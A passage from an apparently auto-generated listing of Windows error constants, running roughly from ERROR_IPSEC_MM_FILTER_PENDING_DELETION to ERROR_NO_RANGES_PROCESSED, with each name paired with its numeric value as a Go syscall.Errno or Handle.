ERROR_IPSEC_MM_FILTER_PENDING_DELETION                                    syscall.Errno = 13018
ERROR_IPSEC_MM_POLICY_EXISTS                                              syscall.Errno = 13003
ERROR_IPSEC_MM_POLICY_IN_USE                                              syscall.Errno = 13005
ERROR_IPSEC_MM_POLICY_NOT_FOUND                                           syscall.Errno = 13004
ERROR_IPSEC_MM_POLICY_PENDING_DELETION                                    syscall.Errno = 13021
ERROR_IPSEC_QM_POLICY_EXISTS                                              syscall.Errno = 13000
ERROR_IPSEC_QM_POLICY_IN_USE                                              syscall.Errno = 13002
ERROR_IPSEC_QM_POLICY_NOT_FOUND                                           syscall.Errno = 13001
ERROR_IPSEC_QM_POLICY_PENDING_DELETION                                    syscall.Errno = 13023
ERROR_IPSEC_REPLAY_CHECK_FAILED                                           syscall.Errno = 13913
ERROR_IPSEC_SA_LIFETIME_EXPIRED                                           syscall.Errno = 13911
ERROR_IPSEC_THROTTLE_DROP                                                 syscall.Errno = 13918
ERROR_IPSEC_TRANSPORT_FILTER_EXISTS                                       syscall.Errno = 13008
ERROR_IPSEC_TRANSPORT_FILTER_NOT_FOUND                                    syscall.Errno = 13009
ERROR_IPSEC_TRANSPORT_FILTER_PENDING_DELETION                             syscall.Errno = 13019
ERROR_IPSEC_TUNNEL_FILTER_EXISTS                                          syscall.Errno = 13016
ERROR_IPSEC_TUNNEL_FILTER_NOT_FOUND                                       syscall.Errno = 13017
ERROR_IPSEC_TUNNEL_FILTER_PENDING_DELETION                                syscall.Errno = 13020
ERROR_IPSEC_WRONG_SA                                                      syscall.Errno = 13912
ERROR_IP_ADDRESS_CONFLICT1                                                syscall.Errno = 611
ERROR_IP_ADDRESS_CONFLICT2                                                syscall.Errno = 612
ERROR_IRQ_BUSY                                                            syscall.Errno = 1119
ERROR_IS_JOINED                                                           syscall.Errno = 134
ERROR_IS_JOIN_PATH                                                        syscall.Errno = 147
ERROR_IS_JOIN_TARGET                                                      syscall.Errno = 133
ERROR_IS_SUBSTED                                                          syscall.Errno = 135
ERROR_IS_SUBST_PATH                                                       syscall.Errno = 146
ERROR_IS_SUBST_TARGET                                                     syscall.Errno = 149
ERROR_ITERATED_DATA_EXCEEDS_64k                                           syscall.Errno = 194
ERROR_JOB_NO_CONTAINER                                                    syscall.Errno = 1505
ERROR_JOIN_TO_JOIN                                                        syscall.Errno = 138
ERROR_JOIN_TO_SUBST                                                       syscall.Errno = 140
ERROR_JOURNAL_DELETE_IN_PROGRESS                                          syscall.Errno = 1178
ERROR_JOURNAL_ENTRY_DELETED                                               syscall.Errno = 1181
ERROR_JOURNAL_HOOK_SET                                                    syscall.Errno = 1430
ERROR_JOURNAL_NOT_ACTIVE                                                  syscall.Errno = 1179
ERROR_KERNEL_APC                                                          syscall.Errno = 738
ERROR_KEY_DELETED                                                         syscall.Errno = 1018
ERROR_KEY_DOES_NOT_EXIST                     Errno = 0x20000000 
ERROR_KEY_HAS_CHILDREN                                                    syscall.Errno = 1020
ERROR_KM_DRIVER_BLOCKED                                                   syscall.Errno = 1930
ERROR_LABEL_TOO_LONG                                                      syscall.Errno = 154
ERROR_LAST_ADMIN                                                          syscall.Errno = 1322
ERROR_LB_WITHOUT_TABSTOPS                                                 syscall.Errno = 1434
ERROR_LIBRARY_FULL                                                        syscall.Errno = 4322
ERROR_LIBRARY_OFFLINE                                                     syscall.Errno = 4305
ERROR_LICENSE_QUOTA_EXCEEDED                                              syscall.Errno = 1395
ERROR_LINE_NOT_FOUND                         Errno = 0x20000000 
ERROR_LINUX_SUBSYSTEM_NOT_PRESENT                                         syscall.Errno = 414
ERROR_LISTBOX_ID_NOT_FOUND                                                syscall.Errno = 1416
ERROR_LM_CROSS_ENCRYPTION_REQUIRED                                        syscall.Errno = 1390
ERROR_LOCAL_USER_SESSION_KEY                                              syscall.Errno = 1303
ERROR_LOCKED                                                              syscall.Errno = 212
ERROR_LOCK_FAILED                                                         syscall.Errno = 167
ERROR_LOCK_VIOLATION                                                      syscall.Errno = 33
ERROR_LOGIN_TIME_RESTRICTION                                              syscall.Errno = 1239
ERROR_LOGIN_WKSTA_RESTRICTION                                             syscall.Errno = 1240
ERROR_LOGON_FAILURE                                                       syscall.Errno = 1326
ERROR_LOGON_NOT_GRANTED                                                   syscall.Errno = 1380
ERROR_LOGON_SERVER_CONFLICT                                               syscall.Errno = 568
ERROR_LOGON_SESSION_COLLISION                                             syscall.Errno = 1366
ERROR_LOGON_SESSION_EXISTS                                                syscall.Errno = 1363
ERROR_LOGON_TYPE_NOT_GRANTED                                              syscall.Errno = 1385
ERROR_LOG_APPENDED_FLUSH_FAILED                                           syscall.Errno = 6647
ERROR_LOG_ARCHIVE_IN_PROGRESS                                             syscall.Errno = 6633
ERROR_LOG_ARCHIVE_NOT_IN_PROGRESS                                         syscall.Errno = 6632
ERROR_LOG_BLOCKS_EXHAUSTED                                                syscall.Errno = 6605
ERROR_LOG_BLOCK_INCOMPLETE                                                syscall.Errno = 6603
ERROR_LOG_BLOCK_INVALID                                                   syscall.Errno = 6609
ERROR_LOG_BLOCK_VERSION                                                   syscall.Errno = 6608
ERROR_LOG_CANT_DELETE                                                     syscall.Errno = 6616
ERROR_LOG_CLIENT_ALREADY_REGISTERED                                       syscall.Errno = 6636
ERROR_LOG_CLIENT_NOT_REGISTERED                                           syscall.Errno = 6637
ERROR_LOG_CONTAINER_LIMIT_EXCEEDED                                        syscall.Errno = 6617
ERROR_LOG_CONTAINER_OPEN_FAILED                                           syscall.Errno = 6641
ERROR_LOG_CONTAINER_READ_FAILED                                           syscall.Errno = 6639
ERROR_LOG_CONTAINER_STATE_INVALID                                         syscall.Errno = 6642
ERROR_LOG_CONTAINER_WRITE_FAILED                                          syscall.Errno = 6640
ERROR_LOG_CORRUPTION_DETECTED                                             syscall.Errno = 6817
ERROR_LOG_DEDICATED                                                       syscall.Errno = 6631
ERROR_LOG_EPHEMERAL                                                       syscall.Errno = 6634
ERROR_LOG_FILE_FULL                                                       syscall.Errno = 1502
ERROR_LOG_FULL                                                            syscall.Errno = 6628
ERROR_LOG_FULL_HANDLER_IN_PROGRESS                                        syscall.Errno = 6638
ERROR_LOG_GROWTH_FAILED                                                   syscall.Errno = 6833
ERROR_LOG_HARD_ERROR                                                      syscall.Errno = 718
ERROR_LOG_INCONSISTENT_SECURITY                                           syscall.Errno = 6646
ERROR_LOG_INVALID_RANGE                                                   syscall.Errno = 6604
ERROR_LOG_METADATA_CORRUPT                                                syscall.Errno = 6612
ERROR_LOG_METADATA_FLUSH_FAILED                                           syscall.Errno = 6645
ERROR_LOG_METADATA_INCONSISTENT                                           syscall.Errno = 6614
ERROR_LOG_METADATA_INVALID                                                syscall.Errno = 6613
ERROR_LOG_MULTIPLEXED                                                     syscall.Errno = 6630
ERROR_LOG_NOT_ENOUGH_CONTAINERS                                           syscall.Errno = 6635
ERROR_LOG_NO_RESTART                                                      syscall.Errno = 6611
ERROR_LOG_PINNED                                                          syscall.Errno = 6644
ERROR_LOG_PINNED_ARCHIVE_TAIL                                             syscall.Errno = 6623
ERROR_LOG_PINNED_RESERVATION                                              syscall.Errno = 6648
ERROR_LOG_POLICY_ALREADY_INSTALLED                                        syscall.Errno = 6619
ERROR_LOG_POLICY_CONFLICT                                                 syscall.Errno = 6622
ERROR_LOG_POLICY_INVALID                                                  syscall.Errno = 6621
ERROR_LOG_POLICY_NOT_INSTALLED                                            syscall.Errno = 6620
ERROR_LOG_READ_CONTEXT_INVALID                                            syscall.Errno = 6606
ERROR_LOG_READ_MODE_INVALID                                               syscall.Errno = 6610
ERROR_LOG_RECORDS_RESERVED_INVALID                                        syscall.Errno = 6625
ERROR_LOG_RECORD_NONEXISTENT                                              syscall.Errno = 6624
ERROR_LOG_RESERVATION_INVALID                                             syscall.Errno = 6615
ERROR_LOG_RESIZE_INVALID_SIZE                                             syscall.Errno = 6806
ERROR_LOG_RESTART_INVALID                                                 syscall.Errno = 6607
ERROR_LOG_SECTOR_INVALID                                                  syscall.Errno = 6600
ERROR_LOG_SECTOR_PARITY_INVALID                                           syscall.Errno = 6601
ERROR_LOG_SECTOR_REMAPPED                                                 syscall.Errno = 6602
ERROR_LOG_SPACE_RESERVED_INVALID                                          syscall.Errno = 6626
ERROR_LOG_START_OF_LOG                                                    syscall.Errno = 6618
ERROR_LOG_STATE_INVALID                                                   syscall.Errno = 6643
ERROR_LOG_TAIL_INVALID                                                    syscall.Errno = 6627
ERROR_LONGJUMP                                                            syscall.Errno = 682
ERROR_LOST_MODE_LOGON_RESTRICTION                                         syscall.Errno = 1939
ERROR_LOST_WRITEBEHIND_DATA                                               syscall.Errno = 596
ERROR_LOST_WRITEBEHIND_DATA_LOCAL_DISK_ERROR                              syscall.Errno = 790
ERROR_LOST_WRITEBEHIND_DATA_NETWORK_DISCONNECTED                          syscall.Errno = 788
ERROR_LOST_WRITEBEHIND_DATA_NETWORK_SERVER_ERROR                          syscall.Errno = 789
ERROR_LUIDS_EXHAUSTED                                                     syscall.Errno = 1334
ERROR_MACHINE_LOCKED                                                      syscall.Errno = 1271
ERROR_MACHINE_UNAVAILABLE                    Errno = 0x20000000 
ERROR_MAGAZINE_NOT_PRESENT                                                syscall.Errno = 1163
ERROR_MALFORMED_SUBSTITUTION_STRING                                       syscall.Errno = 14094
ERROR_MAPPED_ALIGNMENT                                                    syscall.Errno = 1132
ERROR_MARKED_TO_DISALLOW_WRITES                                           syscall.Errno = 348
ERROR_MARSHALL_OVERFLOW                                                   syscall.Errno = 603
ERROR_MAX_SESSIONS_REACHED                                                syscall.Errno = 353
ERROR_MAX_THRDS_REACHED                                                   syscall.Errno = 164
ERROR_MCA_EXCEPTION                                                       syscall.Errno = 784
ERROR_MCA_INTERNAL_ERROR                                                  syscall.Errno = 15205
ERROR_MCA_INVALID_CAPABILITIES_STRING                                     syscall.Errno = 15200
ERROR_MCA_INVALID_TECHNOLOGY_TYPE_RETURNED                                syscall.Errno = 15206
ERROR_MCA_INVALID_VCP_VERSION                                             syscall.Errno = 15201
ERROR_MCA_MCCS_VERSION_MISMATCH                                           syscall.Errno = 15203
ERROR_MCA_MONITOR_VIOLATES_MCCS_SPECIFICATION                             syscall.Errno = 15202
ERROR_MCA_OCCURED                                                         syscall.Errno = 651
ERROR_MCA_UNSUPPORTED_COLOR_TEMPERATURE                                   syscall.Errno = 15207
ERROR_MCA_UNSUPPORTED_MCCS_VERSION                                        syscall.Errno = 15204
ERROR_MEDIA_CHANGED                                                       syscall.Errno = 1110
ERROR_MEDIA_CHECK                                                         syscall.Errno = 679
ERROR_MEDIA_INCOMPATIBLE                                                  syscall.Errno = 4315
ERROR_MEDIA_NOT_AVAILABLE                                                 syscall.Errno = 4318
ERROR_MEDIA_OFFLINE                                                       syscall.Errno = 4304
ERROR_MEDIA_UNAVAILABLE                                                   syscall.Errno = 4308
ERROR_MEDIUM_NOT_ACCESSIBLE                                               syscall.Errno = 4323
ERROR_MEMBERS_PRIMARY_GROUP                                               syscall.Errno = 1374
ERROR_MEMBER_IN_ALIAS                                                     syscall.Errno = 1378
ERROR_MEMBER_IN_GROUP                                                     syscall.Errno = 1320
ERROR_MEMBER_NOT_IN_ALIAS                                                 syscall.Errno = 1377
ERROR_MEMBER_NOT_IN_GROUP                                                 syscall.Errno = 1321
ERROR_MEMORY_HARDWARE                                                     syscall.Errno = 779
ERROR_MENU_ITEM_NOT_FOUND                                                 syscall.Errno = 1456
ERROR_MESSAGE_EXCEEDS_MAX_SIZE                                            syscall.Errno = 4336
ERROR_MESSAGE_SYNC_ONLY                                                   syscall.Errno = 1159
ERROR_METAFILE_NOT_SUPPORTED                                              syscall.Errno = 2003
ERROR_META_EXPANSION_TOO_LONG                                             syscall.Errno = 208
ERROR_MINIVERSION_INACCESSIBLE_FROM_SPECIFIED_TRANSACTION                 syscall.Errno = 6810
ERROR_MISSING_SYSTEMFILE                                                  syscall.Errno = 573
ERROR_MOD_NOT_FOUND                                                       syscall.Errno = 126
ERROR_MONITOR_INVALID_DESCRIPTOR_CHECKSUM                                 Handle        = 0xC0261003
ERROR_MONITOR_INVALID_DETAILED_TIMING_BLOCK                               Handle        = 0xC0261009
ERROR_MONITOR_INVALID_MANUFACTURE_DATE                                    Handle        = 0xC026100A
ERROR_MONITOR_INVALID_SERIAL_NUMBER_MONDSC_BLOCK                          Handle        = 0xC0261006
ERROR_MONITOR_INVALID_STANDARD_TIMING_BLOCK                               Handle        = 0xC0261004
ERROR_MONITOR_INVALID_USER_FRIENDLY_MONDSC_BLOCK                          Handle        = 0xC0261007
ERROR_MONITOR_NO_DESCRIPTOR                                               Handle        = 0x00261001
ERROR_MONITOR_NO_MORE_DESCRIPTOR_DATA                                     Handle        = 0xC0261008
ERROR_MONITOR_UNKNOWN_DESCRIPTOR_FORMAT                                   Handle        = 0x00261002
ERROR_MONITOR_WMI_DATABLOCK_REGISTRATION_FAILED                           Handle        = 0xC0261005
ERROR_MORE_DATA                                                           syscall.Errno = 234
ERROR_MORE_WRITES                                                         syscall.Errno = 1120
ERROR_MOUNT_POINT_NOT_RESOLVED                                            syscall.Errno = 649
ERROR_MP_PROCESSOR_MISMATCH                                               syscall.Errno = 725
ERROR_MRM_AUTOMERGE_ENABLED                                               syscall.Errno = 15139
ERROR_MRM_DIRECT_REF_TO_NON_DEFAULT_RESOURCE                              syscall.Errno = 15146
ERROR_MRM_DUPLICATE_ENTRY                                                 syscall.Errno = 15119
ERROR_MRM_DUPLICATE_MAP_NAME                                              syscall.Errno = 15118
ERROR_MRM_FILEPATH_TOO_LONG                                               syscall.Errno = 15121
ERROR_MRM_GENERATION_COUNT_MISMATCH                                       syscall.Errno = 15147
ERROR_MRM_INDETERMINATE_QUALIFIER_VALUE                                   syscall.Errno = 15138
ERROR_MRM_INVALID_FILE_TYPE                                               syscall.Errno = 15112
ERROR_MRM_INVALID_PRICONFIG                                               syscall.Errno = 15111
ERROR_MRM_INVALID_PRI_FILE                                                syscall.Errno = 15126
ERROR_MRM_INVALID_QUALIFIER_OPERATOR                                      syscall.Errno = 15137
ERROR_MRM_INVALID_QUALIFIER_VALUE                                         syscall.Errno = 15114
ERROR_MRM_INVALID_RESOURCE_IDENTIFIER                                     syscall.Errno = 15120
ERROR_MRM_MAP_NOT_FOUND                                                   syscall.Errno = 15135
ERROR_MRM_MISSING_DEFAULT_LANGUAGE                                        syscall.Errno = 15160
ERROR_MRM_NAMED_RESOURCE_NOT_FOUND                                        syscall.Errno = 15127
ERROR_MRM_NO_CANDIDATE                                                    syscall.Errno = 15115
ERROR_MRM_NO_CURRENT_VIEW_ON_THREAD                                       syscall.Errno = 15143
ERROR_MRM_NO_MATCH_OR_DEFAULT_CANDIDATE                                   syscall.Errno = 15116
ERROR_MRM_PACKAGE_NOT_FOUND                                               syscall.Errno = 15159
ERROR_MRM_RESOURCE_TYPE_MISMATCH                                          syscall.Errno = 15117
ERROR_MRM_RUNTIME_NO_DEFAULT_OR_NEUTRAL_RESOURCE                          syscall.Errno = 15110
ERROR_MRM_TOO_MANY_RESOURCES                                              syscall.Errno = 15140
ERROR_MRM_UNKNOWN_QUALIFIER                                               syscall.Errno = 15113
ERROR_MRM_UNSUPPORTED_DIRECTORY_TYPE                                      syscall.Errno = 15122
ERROR_MRM_UNSUPPORTED_FILE_TYPE_FOR_LOAD_UNLOAD_PRI_FILE                  syscall.Errno = 15142
ERROR_MRM_UNSUPPORTED_FILE_TYPE_FOR_MERGE                                 syscall.Errno = 15141
ERROR_MRM_UNSUPPORTED_PROFILE_TYPE                                        syscall.Errno = 15136
ERROR_MR_MID_NOT_FOUND                                                    syscall.Errno = 317
ERROR_MUI_FILE_NOT_FOUND                                                  syscall.Errno = 15100
ERROR_MUI_FILE_NOT_LOADED                                                 syscall.Errno = 15105
ERROR_MUI_INTLSETTINGS_INVALID_LOCALE_NAME                                syscall.Errno = 15108
ERROR_MUI_INTLSETTINGS_UILANG_NOT_INSTALLED                               syscall.Errno = 15107
ERROR_MUI_INVALID_FILE                                                    syscall.Errno = 15101
ERROR_MUI_INVALID_LOCALE_NAME                                             syscall.Errno = 15103
ERROR_MUI_INVALID_RC_CONFIG                                               syscall.Errno = 15102
ERROR_MUI_INVALID_ULTIMATEFALLBACK_NAME                                   syscall.Errno = 15104
ERROR_MULTIPLE_FAULT_VIOLATION                                            syscall.Errno = 640
ERROR_MUTANT_LIMIT_EXCEEDED                                               syscall.Errno = 587
ERROR_MUTUAL_AUTH_FAILED                                                  syscall.Errno = 1397
ERROR_NDIS_ADAPTER_NOT_FOUND                                              syscall.Errno = 0x80340006
ERROR_NDIS_ADAPTER_NOT_READY                                              syscall.Errno = 0x80340011
ERROR_NDIS_ADAPTER_REMOVED                                                syscall.Errno = 0x80340018
ERROR_NDIS_ALREADY_MAPPED                                                 syscall.Errno = 0x8034001D
ERROR_NDIS_BAD_CHARACTERISTICS                                            syscall.Errno = 0x80340005
ERROR_NDIS_BAD_VERSION                                                    syscall.Errno = 0x80340004
ERROR_NDIS_BUFFER_TOO_SHORT                                               syscall.Errno = 0x80340016
ERROR_NDIS_DEVICE_FAILED                                                  syscall.Errno = 0x80340008
ERROR_NDIS_DOT11_AP_BAND_CURRENTLY_NOT_AVAILABLE                          syscall.Errno = 0x80342006
ERROR_NDIS_DOT11_AP_BAND_NOT_ALLOWED                                      syscall.Errno = 0x80342008
ERROR_NDIS_DOT11_AP_CHANNEL_CURRENTLY_NOT_AVAILABLE                       syscall.Errno = 0x80342005
ERROR_NDIS_DOT11_AP_CHANNEL_NOT_ALLOWED                                   syscall.Errno = 0x80342007
ERROR_NDIS_DOT11_AUTO_CONFIG_ENABLED                                      syscall.Errno = 0x80342000
ERROR_NDIS_DOT11_MEDIA_IN_USE                                             syscall.Errno = 0x80342001
ERROR_NDIS_DOT11_POWER_STATE_INVALID                                      syscall.Errno = 0x80342002
ERROR_NDIS_ERROR_READING_FILE                                             syscall.Errno = 0x8034001C
ERROR_NDIS_FILE_NOT_FOUND                                                 syscall.Errno = 0x8034001B
ERROR_NDIS_GROUP_ADDRESS_IN_USE                                           syscall.Errno = 0x8034001A
ERROR_NDIS_INDICATION_REQUIRED                                            syscall.Errno = 0x00340001
ERROR_NDIS_INTERFACE_CLOSING                                              syscall.Errno = 0x80340002
ERROR_NDIS_INTERFACE_NOT_FOUND                                            syscall.Errno = 0x8034002B
ERROR_NDIS_INVALID_ADDRESS                                                syscall.Errno = 0x80340022
ERROR_NDIS_INVALID_DATA                                                   syscall.Errno = 0x80340015
ERROR_NDIS_INVALID_DEVICE_REQUEST                                         syscall.Errno = 0x80340010
ERROR_NDIS_INVALID_LENGTH                                                 syscall.Errno = 0x80340014
ERROR_NDIS_INVALID_OID                                                    syscall.Errno = 0x80340017
ERROR_NDIS_INVALID_PACKET                                                 syscall.Errno = 0x8034000F
ERROR_NDIS_INVALID_PORT                                                   syscall.Errno = 0x8034002D
ERROR_NDIS_INVALID_PORT_STATE                                             syscall.Errno = 0x8034002E
ERROR_NDIS_LOW_POWER_STATE                                                syscall.Errno = 0x8034002F
ERROR_NDIS_MEDIA_DISCONNECTED                                             syscall.Errno = 0x8034001F
ERROR_NDIS_MULTICAST_EXISTS                                               syscall.Errno = 0x8034000A
ERROR_NDIS_MULTICAST_FULL                                                 syscall.Errno = 0x80340009
ERROR_NDIS_MULTICAST_NOT_FOUND                                            syscall.Errno = 0x8034000B
ERROR_NDIS_NOT_SUPPORTED                                                  syscall.Errno = 0x803400BB
ERROR_NDIS_NO_QUEUES                                                      syscall.Errno = 0x80340031
ERROR_NDIS_OFFLOAD_CONNECTION_REJECTED                                    syscall.Errno = 0xC0341012
ERROR_NDIS_OFFLOAD_PATH_REJECTED                                          syscall.Errno = 0xC0341013
ERROR_NDIS_OFFLOAD_POLICY                                                 syscall.Errno = 0xC034100F
ERROR_NDIS_OPEN_FAILED                                                    syscall.Errno = 0x80340007
ERROR_NDIS_PAUSED                                                         syscall.Errno = 0x8034002A
ERROR_NDIS_PM_PROTOCOL_OFFLOAD_LIST_FULL                                  syscall.Errno = 0x80342004
ERROR_NDIS_PM_WOL_PATTERN_LIST_FULL                                       syscall.Errno = 0x80342003
ERROR_NDIS_REINIT_REQUIRED                                                syscall.Errno = 0x80340030
ERROR_NDIS_REQUEST_ABORTED                                                syscall.Errno = 0x8034000C
ERROR_NDIS_RESET_IN_PROGRESS                                              syscall.Errno = 0x8034000D
ERROR_NDIS_RESOURCE_CONFLICT                                              syscall.Errno = 0x8034001E
ERROR_NDIS_UNSUPPORTED_MEDIA                                              syscall.Errno = 0x80340019
ERROR_NDIS_UNSUPPORTED_REVISION                                           syscall.Errno = 0x8034002C
ERROR_NEEDS_REGISTRATION                                                  syscall.Errno = 15631
ERROR_NEEDS_REMEDIATION                                                   syscall.Errno = 15612
ERROR_NEGATIVE_SEEK                                                       syscall.Errno = 131
ERROR_NESTING_NOT_ALLOWED                                                 syscall.Errno = 215
ERROR_NETLOGON_NOT_STARTED                                                syscall.Errno = 1792
ERROR_NETNAME_DELETED                                                     syscall.Errno = 64
ERROR_NETWORK_ACCESS_DENIED                                               syscall.Errno = 65
ERROR_NETWORK_ACCESS_DENIED_EDP                                           syscall.Errno = 354
ERROR_NETWORK_BUSY                                                        syscall.Errno = 54
ERROR_NETWORK_NOT_AVAILABLE                                               syscall.Errno = 5035
ERROR_NETWORK_UNREACHABLE                                                 syscall.Errno = 1231
ERROR_NET_OPEN_FAILED                                                     syscall.Errno = 570
ERROR_NET_WRITE_FAULT                                                     syscall.Errno = 88
ERROR_NOACCESS                                                            syscall.Errno = 998
ERROR_NODE_CANNOT_BE_CLUSTERED                                            syscall.Errno = 5898
ERROR_NODE_CANT_HOST_RESOURCE                                             syscall.Errno = 5071
ERROR_NODE_NOT_ACTIVE_CLUSTER_MEMBER                                      syscall.Errno = 5980
ERROR_NODE_NOT_AVAILABLE                                                  syscall.Errno = 5036
ERROR_NOINTERFACE                                                         syscall.Errno = 632
ERROR_NOLOGON_INTERDOMAIN_TRUST_ACCOUNT                                   syscall.Errno = 1807
ERROR_NOLOGON_SERVER_TRUST_ACCOUNT                                        syscall.Errno = 1809
ERROR_NOLOGON_WORKSTATION_TRUST_ACCOUNT                                   syscall.Errno = 1808
ERROR_NONCORE_GROUPS_FOUND                                                syscall.Errno = 5937
ERROR_NONE_MAPPED                                                         syscall.Errno = 1332
ERROR_NONPAGED_SYSTEM_RESOURCES                                           syscall.Errno = 1451
ERROR_NON_ACCOUNT_SID                                                     syscall.Errno = 1257
ERROR_NON_CSV_PATH                                                        syscall.Errno = 5950
ERROR_NON_DOMAIN_SID                                                      syscall.Errno = 1258
ERROR_NON_MDICHILD_WINDOW                                                 syscall.Errno = 1445
ERROR_NON_WINDOWS_DRIVER                     Errno = 0x20000000 
ERROR_NON_WINDOWS_NT_DRIVER                  Errno = 0x20000000 
ERROR_NOTHING_TO_TERMINATE                                                syscall.Errno = 758
ERROR_NOTIFICATION_GUID_ALREADY_DEFINED                                   syscall.Errno = 309
ERROR_NOTIFY_CLEANUP                                                      syscall.Errno = 745
ERROR_NOTIFY_ENUM_DIR                                                     syscall.Errno = 1022
ERROR_NOT_ALLOWED_ON_SYSTEM_FILE                                          syscall.Errno = 313
ERROR_NOT_ALL_ASSIGNED                                                    syscall.Errno = 1300
ERROR_NOT_AN_INSTALLED_OEM_INF               Errno = 0x20000000 
ERROR_NOT_APPCONTAINER                                                    syscall.Errno = 4250
ERROR_NOT_AUTHENTICATED                                                   syscall.Errno = 1244
ERROR_NOT_A_CLOUD_FILE                                                    syscall.Errno = 376
ERROR_NOT_A_CLOUD_SYNC_ROOT                                               syscall.Errno = 405
ERROR_NOT_A_DAX_VOLUME                                                    syscall.Errno = 420
ERROR_NOT_A_REPARSE_POINT                                                 syscall.Errno = 4390
ERROR_NOT_A_TIERED_VOLUME                                                 Handle        = 0x80830009
ERROR_NOT_CAPABLE                                                         syscall.Errno = 775
ERROR_NOT_CHILD_WINDOW                                                    syscall.Errno = 1442
ERROR_NOT_CONNECTED                                                       syscall.Errno = 2250
ERROR_NOT_CONTAINER                                                       syscall.Errno = 1207
ERROR_NOT_DAX_MAPPABLE                                                    syscall.Errno = 421
ERROR_NOT_DISABLEABLE                        Errno = 0x20000000 
ERROR_NOT_DOS_DISK                                                        syscall.Errno = 26
ERROR_NOT_EMPTY                                                           syscall.Errno = 4307
ERROR_NOT_ENOUGH_MEMORY                                                   syscall.Errno = 8
ERROR_NOT_ENOUGH_QUOTA                                                    syscall.Errno = 1816
ERROR_NOT_ENOUGH_SERVER_MEMORY                                            syscall.Errno = 1130
ERROR_NOT_EXPORT_FORMAT                                                   syscall.Errno = 6008
ERROR_NOT_FOUND                                                           syscall.Errno = 1168
ERROR_NOT_GUI_PROCESS                                                     syscall.Errno = 1471
ERROR_NOT_JOINED                                                          syscall.Errno = 136
ERROR_NOT_LOCKED                                                          syscall.Errno = 158
ERROR_NOT_LOGGED_ON                                                       syscall.Errno = 1245
ERROR_NOT_LOGON_PROCESS                                                   syscall.Errno = 1362
ERROR_NOT_OWNER                                                           syscall.Errno = 288
ERROR_NOT_QUORUM_CAPABLE                                                  syscall.Errno = 5021
ERROR_NOT_QUORUM_CLASS                                                    syscall.Errno = 5025
ERROR_NOT_READY                                                           syscall.Errno = 21
ERROR_NOT_READ_FROM_COPY                                                  syscall.Errno = 337
ERROR_NOT_REDUNDANT_STORAGE                                               syscall.Errno = 333
ERROR_NOT_REGISTRY_FILE                                                   syscall.Errno = 1017
ERROR_NOT_SAFEBOOT_SERVICE                                                syscall.Errno = 1084
ERROR_NOT_SAFE_MODE_DRIVER                                                syscall.Errno = 646
ERROR_NOT_SAME_DEVICE                                                     syscall.Errno = 17
ERROR_NOT_SAME_OBJECT                                                     syscall.Errno = 1656
ERROR_NOT_SNAPSHOT_VOLUME                                                 syscall.Errno = 6841
ERROR_NOT_SUBSTED                                                         syscall.Errno = 137
ERROR_NOT_SUPPORTED                                                       syscall.Errno = 50
ERROR_NOT_SUPPORTED_IN_APPCONTAINER                                       syscall.Errno = 4252
ERROR_NOT_SUPPORTED_ON_DAX                                                syscall.Errno = 360
ERROR_NOT_SUPPORTED_ON_SBS                                                syscall.Errno = 1254
ERROR_NOT_SUPPORTED_ON_STANDARD_SERVER                                    syscall.Errno = 8584
ERROR_NOT_SUPPORTED_WITH_BTT                                              syscall.Errno = 429
ERROR_NOT_TINY_STREAM                                                     syscall.Errno = 598
ERROR_NO_ACE_CONDITION                                                    syscall.Errno = 804
ERROR_NO_ADMIN_ACCESS_POINT                                               syscall.Errno = 5090
ERROR_NO_APPLICABLE_APP_LICENSES_FOUND                                    Handle        = 0xC0EA0001
ERROR_NO_ASSOCIATED_CLASS                    Errno = 0x20000000 
ERROR_NO_ASSOCIATED_SERVICE                  Errno = 0x20000000 
ERROR_NO_ASSOCIATION                                                      syscall.Errno = 1155
ERROR_NO_AUTHENTICODE_CATALOG                Errno = 0x20000000 
ERROR_NO_BACKUP                              Errno = 0x20000000 
ERROR_NO_BROWSER_SERVERS_FOUND                                            syscall.Errno = 6118
ERROR_NO_CALLBACK_ACTIVE                                                  syscall.Errno = 614
ERROR_NO_CATALOG_FOR_OEM_INF                 Errno = 0x20000000 
ERROR_NO_CLASSINSTALL_PARAMS                 Errno = 0x20000000 
ERROR_NO_CLASS_DRIVER_LIST                   Errno = 0x20000000 
ERROR_NO_COMPAT_DRIVERS                      Errno = 0x20000000 
ERROR_NO_CONFIGMGR_SERVICES                  Errno = 0x20000000 
ERROR_NO_DATA                                                             syscall.Errno = 232
ERROR_NO_DATA_DETECTED                                                    syscall.Errno = 1104
ERROR_NO_DEFAULT_DEVICE_INTERFACE            Errno = 0x20000000 
ERROR_NO_DEFAULT_INTERFACE_DEVICE            Errno = ERROR_NO_DEFAULT_DEVICE_INTERFACE
ERROR_NO_DEVICE_ICON                         Errno = 0x20000000 
ERROR_NO_DEVICE_SELECTED                     Errno = 0x20000000 
ERROR_NO_DRIVER_SELECTED                     Errno = 0x20000000 
ERROR_NO_EFS                                                              syscall.Errno = 6004
ERROR_NO_EVENT_PAIR                                                       syscall.Errno = 580
ERROR_NO_GUID_TRANSLATION                                                 syscall.Errno = 560
ERROR_NO_IMPERSONATION_TOKEN                                              syscall.Errno = 1309
ERROR_NO_INF                                 Errno = 0x20000000 
ERROR_NO_INHERITANCE                                                      syscall.Errno = 1391
ERROR_NO_LINK_TRACKING_IN_TRANSACTION                                     syscall.Errno = 6852
ERROR_NO_LOGON_SERVERS                                                    syscall.Errno = 1311
ERROR_NO_LOG_SPACE                                                        syscall.Errno = 1019
ERROR_NO_MATCH                                                            syscall.Errno = 1169
ERROR_NO_MEDIA_IN_DRIVE                                                   syscall.Errno = 1112
ERROR_NO_MORE_DEVICES                                                     syscall.Errno = 1248
ERROR_NO_MORE_FILES                                                       syscall.Errno = 18
ERROR_NO_MORE_ITEMS                                                       syscall.Errno = 259
ERROR_NO_MORE_MATCHES                                                     syscall.Errno = 626
ERROR_NO_MORE_SEARCH_HANDLES                                              syscall.Errno = 113
ERROR_NO_MORE_USER_HANDLES                                                syscall.Errno = 1158
ERROR_NO_NETWORK                                                          syscall.Errno = 1222
ERROR_NO_NET_OR_BAD_PATH                                                  syscall.Errno = 1203
ERROR_NO_NVRAM_RESOURCES                                                  syscall.Errno = 1470
ERROR_NO_PAGEFILE                                                         syscall.Errno = 578
ERROR_NO_PHYSICALLY_ALIGNED_FREE_SPACE_FOUND                              syscall.Errno = 408
ERROR_NO_PROC_SLOTS                                                       syscall.Errno = 89
ERROR_NO_PROMOTION_ACTIVE                                                 syscall.Errno = 8222
ERROR_NO_QUOTAS_FOR_ACCOUNT                                               syscall.Errno = 1302
ERROR_NO_RANGES_PROCESSED                                                 syscall.Errno = 312
